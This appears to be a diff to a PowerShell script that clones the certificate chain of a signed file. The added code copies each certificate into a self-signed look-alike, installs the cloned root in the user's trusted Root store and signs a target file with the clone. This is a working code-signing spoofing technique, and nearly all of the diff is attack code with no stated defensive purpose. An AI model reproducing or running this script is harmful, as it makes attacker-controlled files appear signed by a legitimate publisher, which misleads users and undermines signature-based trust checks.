@@ -4,9 +4,37 @@ param([Parameter(Mandatory=$true)] [String]$OriginalFile,
 # Setup Cert Store in Reg
 $CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }
 # Setup Cert Store on Disk
-.\Enumerate-Certificates.ps1 $OriginalFile | ForEach-Object { Export-Certificate -Cert $_.Certificate -Type CERT -FilePath $_.Certificate.Thumbprint + ".cer" }
+$certificates = .\Enumerate-Certificates.ps1 $OriginalFile
 #Get-ChildItem -Path "cert:\CurrentUser\My | ?{$_.Subject -eq "CN=TodoListDaemonWithCert"}
 #[system.io.directory]::CreateDirectory(".\CertStore")
 # Save each certificate to disk
-ForEach-Object { Export-Certificate -Cert $_.Certificate -Type CERT -FilePath $_.Certificate.Thumbprint + ".cer"}
+$imported = $false
+$orig_cert = $null
+$cloned_cert = $null
+For($i = $certificates.Length - 1; $i -gt 0; $i--)
+{
+    $c = $certificates[$i].Certificate;
+    $t = $c.Thumbprint;
+    [byte[]]$cer = $c.Export('Cert');
+    Set-Content -Path ".\$t.cer" -Value $cer -Encoding Byte
+    $orig_cert = Get-PfxCertificate -FilePath ".\$t.cer"
+    if($imported -ne $true)
+    {
+        # no signer for root CA
+        $cloned_cert = New-SelfSignedCertificate -CloneCert $orig_cert @CertStoreLocation
+    }
+    else {
+        $cloned_cert = New-SelfSignedCertificate -CloneCert $orig_cert -Signer $previous_cert @CertStoreLocation
+    }
+    $previous_cert = $cloned_cert
+    if($imported -ne $true)
+    {
+        Export-Certificate -Type CERT -FilePath ".\$t.cer" -Cert $cloned_cert
+        Import-Certificate -FilePath ".\$t.cer" -CertStoreLocation cert:\CurrentUser\Root\
+        $imported = $true
+    }
+}
+
+Set-AuthenticodeSignature -Certificate $cloned_cert -FilePath $TargetFile
+
 Get-AuthenticodeSignature -FilePath $TargetFile # print results
